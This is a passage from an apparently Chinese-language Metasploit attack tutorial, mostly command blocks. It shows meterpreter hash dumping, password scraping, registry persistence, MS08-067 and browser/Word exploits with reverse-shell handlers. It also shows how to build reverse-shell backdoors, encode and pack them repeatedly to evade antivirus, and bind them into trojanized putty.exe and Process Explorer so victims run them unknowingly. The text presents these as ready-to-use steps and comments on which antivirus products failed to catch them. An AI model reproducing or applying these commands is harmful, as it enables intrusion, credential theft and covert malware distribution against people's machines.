class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run post/windows/escalate/bypassuac  ，不然可能不会成功。）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取系统流量数据</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run packtrecorder –i 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>直捣黄龙</p><p>可以干很多事情：获取密码，下载注册表，获取系统信息等</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run scraper</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>持久保持</p><p>当目标机器重启之后仍然可以控制</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>-X 开机启动  -i连接超时时间 –p端口 –rIP</p><p>下次连接时：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPOST 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(会在以下位置和注册表以随机文件名写入文件等信息，如：</p><p>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs</p><p>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe</p><p>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</p><p>POST整合模块</p><p>可实现同时多个session操作</p><p>例子：获取hash</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>其他还有很多，使用TAB键补全看下就知道</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5升级command-shell">5、升级command shell<a class="hash-link" href="#5升级command-shell" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search ms08_067</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z  #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z转到后台</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –u 1  #升级shell，必须前面使用setg设定</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="6使用railgun操作windows-apis">6、使用Railgun操作windows APIs<a class="hash-link" href="#6使用railgun操作windows-apis" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; irb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在目标机器上会弹出一个标题栏为world和内容为hello的窗口</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="七避开杀软">七．避开杀软<a class="hash-link" href="#七避开杀软" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用msfpayload创建可执行后门">1、使用msfpayload创建可执行后门：<a class="hash-link" href="#1使用msfpayload创建可执行后门" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp 0  #查看选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X &gt; /var/www/payload1.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后本机监听端口</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 31337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2过杀软---使用msfencode编码后门">2、过杀软---使用msfencode编码后门：<a class="hash-link" href="#2过杀软---使用msfencode编码后门" title="标题的直接链接">​</a></h3><p>msfencode –l  #列出可用编码器</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用 R参数作为raw输出至管道，再经过msfencode处理，最后导出。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3多次编码">3、多次编码：<a class="hash-link" href="#3多次编码" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/alpha_upper –c 2 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/countdown –c 5 –t exe –o /var/www/payload3.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17次循环编码。</p><p>（题外：经测试，1：使用此命令生成的后门也被MSE杀到；2：未编码的后门或编码次数较少的后门可以直接被秒杀；3：windows/x64/meterpreter/reverse_tcp生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86编码器编码的后门在64位机器上无法执行；5：360有个沙箱功能，后门文件右键选择“在360隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4自定义可执行程序模板">4、自定义可执行程序模板：<a class="hash-link" href="#4自定义可执行程序模板" title="标题的直接链接">​</a></h3><p>msfencode默认使用data/templates/templates.exe（msf v4在templates目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://download.sysinternals.com/Files/ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd work</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unzip ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5暗度陈仓猥琐执行payload">5、暗度陈仓—猥琐执行payload：<a class="hash-link" href="#5暗度陈仓猥琐执行payload" title="标题的直接链接">​</a></h3><p>绑定payload至一个可执行文件，让目标不知不觉间中招，以putty.exe为例：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>假如选择一个GUI界面的程序作为绑定目标并且不使用-k选项，则目标执行此程序的时候不会弹出cmd窗口，-k选项的作用是payload独立于模板软件的进程运行。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="6加壳">6、加壳：<a class="hash-link" href="#6加壳" title="标题的直接链接">​</a></h3><p>msfencode部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后 更保险”，例如UPX ：</p><p><code>apt-get install upx</code></p><p>最新版可到sf.net下载</p><p>使用方法：</p><p><code>upx -5 /var/www/payload3.exe</code></p><p>还有另外一个工具msfvenom结合了msfpayload和msfencode的功能，使用起来更省心，亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="八使用用户端攻击方式client-side-attacks">八．使用用户端攻击方式(client-side attacks)<a class="hash-link" href="#八使用用户端攻击方式client-side-attacks" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1组合型攻击">1、组合型攻击<a class="hash-link" href="#1组合型攻击" title="标题的直接链接">​</a></h3><p>主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 器，pdf阅读器，office软件等，最终获取系统权限。</p><p>基于浏览器的攻击：</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SRVPORT 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set URIPATH /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run migrate</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>或者:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show advanced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set ReverseConnectRetries 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set AutoRunScript migrate –f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2文件格式exploit">2、文件格式exploit<a class="hash-link" href="#2文件格式exploit" title="标题的直接链接">​</a></h3><p>利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/fileformat/ms11_006_createsizeddibsection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此时会生成一个msf.doc的word文档，在目标机器上打开此文档，然后本机监听端口等待反弹连接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="九msf-附加模块">九．MSF 附加模块<a class="hash-link" href="#九msf-附加模块" title="标题的直接链接">​</a></h2><p>包括端口扫描，服务探测，弱口令探测，fuzzer，sql注射等。附加模块没有payload。
模块保存在/opt/framework3/msf3/modules/auxiliary/目录中的各个子目录下。
可用命令查看全部可用附加模块：<code>msf&gt; show auxiliary</code></p><p>例子：
o```
msf&gt; use scanner/http/webdav_scanner
info
show options
set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222
